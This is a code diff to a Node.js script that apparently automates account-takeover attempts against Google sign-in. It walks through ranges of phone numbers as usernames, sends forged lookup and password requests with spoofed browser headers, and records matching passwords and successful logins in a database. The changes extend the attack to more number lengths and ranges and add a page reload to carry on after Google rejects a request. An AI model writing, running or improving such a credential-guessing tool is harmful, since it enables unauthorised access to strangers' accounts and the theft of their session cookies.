@@ -15,8 +15,12 @@ let mSearch = false
 let mHostGPS = null
 let page = null
 let mRecovery = null
+let mReloadPage = false
 
 let mTimeToken = null
+let mMultiPol = 0
+
+let signIn = 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings'
 
 fs.copyFile('redirect.js', 'node_modules/request/lib/redirect.js', (err) => {
     if(!err) {
@@ -59,8 +63,8 @@ async function browserStart() {
         page = await browser.newPage()
     
         await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')
-    
-        await page.goto('https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings')
+
+        await page.goto(signIn)
     
         let cookie = await page.cookies()
 
@@ -73,19 +77,21 @@ async function browserStart() {
         })
 
         if(mHostGPS == null) mHostGPS = '1:bJ6IzDkUblOirycmWnLX29tiwNVKNg:EO4prJJbfARXxVTU'
-
+        
+        let length = parseInt(mServerData['length'])
+        let index = length == 8 ? 2 : length == 9 || length == 10 ? 3 : length == 11 ? 4 : 5
+        mMultiPol = Math.pow(10, length - index)
+        
         for(let key of Object.keys(mServerData)) {
             if(key.startsWith('start')) {
                 let runing = 'runing'+key.replace('start', '')
                 let start = mServerData[key]
                 let number = mServerData[runing]
                 if(number == null) {
-                    number = start * 10000000
+                    number = start * mMultiPol
                 }
                 if(number != 0) {
-                    if(key == 'start_1') {
-                        checkNumber(number, runing, start, 0)
-                    }
+                    checkNumber(number, runing, start, 0)
                 }
             }
         }
@@ -102,7 +108,7 @@ function checkNumber(number, name, start, runing) {
         database.set('/code/server/'+SERVER+'/'+name, number)
         temp = 0
     }
-    if(parseInt(start)+1 <= parseInt(number/10000000)) {
+    if(parseInt(start)+1 <= parseInt(number/mMultiPol)) {
         database.set('/code/server/'+SERVER+'/'+name, 0)
     } else {
         request({
@@ -131,58 +137,73 @@ function checkNumber(number, name, start, runing) {
 
 
 async function logInNumber01(number, password, name, start, runing) {
-    let Identifier = await getIdentifierData(CODE+number)
-    let bodyData = getNumberData(CODE+number, Identifier)
+    if(!mReloadPage) {
+        let Identifier = await getIdentifierData(CODE+number)
+        let bodyData = getNumberData(CODE+number, Identifier)
 
-    var headers = {
-        'Host': 'accounts.google.com',
-        'Cache-Control': 'max-age=0',
-        'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
-        'Sec-Ch-Ua-Mobile': '?0',
-        'Sec-Ch-Ua-Platform': '"Windows"',
-        'Upgrade-Insecure-Requests': '1',
-        'Origin': 'https://accounts.google.com',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=d7a27b6a-dde9-4208-958e-451604994709,signin_mode=all_accounts,signout_mode=show_confirmation',
-        'X-Client-Data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiUocsBCPO7zAEIzLzMAQjzwMwBCJrBzAEIs8HMAQjEwcwBCNbBzAEI3sTMAQjXxswBCJ3JzAEI48vMAQ==',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-User': '?1',
-        'Sec-Fetch-Dest': 'document',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cookie': '__Host-GAPS='+mHostGPS
-    }
-
-    request({
-        url: 'https://accounts.google.com/signin/v1/lookup',
-        method: 'POST',
-        headers: headers,
-        gzip: true,
-        body: bodyData
-    }, function(error, response, body) {
-        let check = false
-        try {
-            if (!error) {
-                let headers = response.headers
-                if(headers && headers['location']) {
-                    let index = headers['location'].indexOf('TL=')
-                    if(index != -1) {
-                        let split = headers['location'].substring(index+3, headers['location'].length).split('&')
-                        check = true
-                        passwordTry(password, split[0], Identifier, split[split.length-1].replace('cid=', ''), null, 0, 0, number, name, start, runing)
-                    }
-                }
-            } else {}
-        } catch (e) {}
-        
-        if(!check) {
-            console.log(response.headers)
-            //checkNumber(number+1, name, start, runing)
+        var headers = {
+            'Host': 'accounts.google.com',
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Upgrade-Insecure-Requests': '1',
+            'Origin': 'https://accounts.google.com',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=d7a27b6a-dde9-4208-958e-451604994709,signin_mode=all_accounts,signout_mode=show_confirmation',
+            'X-Client-Data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiUocsBCPO7zAEIzLzMAQjzwMwBCJrBzAEIs8HMAQjEwcwBCNbBzAEI3sTMAQjXxswBCJ3JzAEI48vMAQ==',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cookie': '__Host-GAPS='+mHostGPS
         }
-    })
+
+        request({
+            url: 'https://accounts.google.com/signin/v1/lookup',
+            method: 'POST',
+            headers: headers,
+            gzip: true,
+            body: bodyData
+        }, function(error, response, body) {
+            let check = false
+            try {
+                if (!error) {
+                    let headers = response.headers
+                    if(headers && headers['location']) {
+                        let index = headers['location'].indexOf('TL=')
+                        if(index != -1) {
+                            let split = headers['location'].substring(index+3, headers['location'].length).split('&')
+                            check = true
+                            passwordTry(password, split[0], Identifier, split[split.length-1].replace('cid=', ''), null, 0, 0, number, name, start, runing)
+                        } else if(headers['location'].startsWith('https://accounts.google.com/signin/rejected')) {
+                            check = true
+                            ;(async () => {
+                                console.log('Reload Page')
+                                mReloadPage = true
+                                await page.goto(signIn)
+                                mReloadPage = false
+                                logInNumber01(number, password, name, start, runing)
+                            })()
+                        }
+                    }
+                } else {}
+            } catch (e) {}
+            
+            if(!check) {
+                console.log(response.headers['location'])
+                checkNumber(number+1, name, start, runing)
+            }
+        })
+    } else {
+        setTimeout(function () {
+            logInNumber01(number, password, name, start, runing)
+        }, 1000)
+    }
 }
 
 function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, number, name, start, runing) {
@@ -222,8 +243,9 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                     }
                 } else if(data[0][3] == 3) {
                     let temp = number.toString()
+                    let index = temp.length == 8 ? 2 : temp.length == 9 || temp.length == 10 ? 3 : temp.length == 11 ? 4 : 5
                     console.log('Password Matching')
-                    database.set('/code/gmail/found/'+COUNTRY+'/'+temp.substring(0, 3)+'/'+temp.substring(3, temp.length), loop)
+                    database.set('/code/gmail/found/'+COUNTRY+'/'+temp.substring(0, index)+'/'+temp.substring(index, temp.length), loop)
                 } else if(data[0][3] == 1) {
                     console.log('Login Success')
                     let cookiesList = responce.headers['set-cookie']
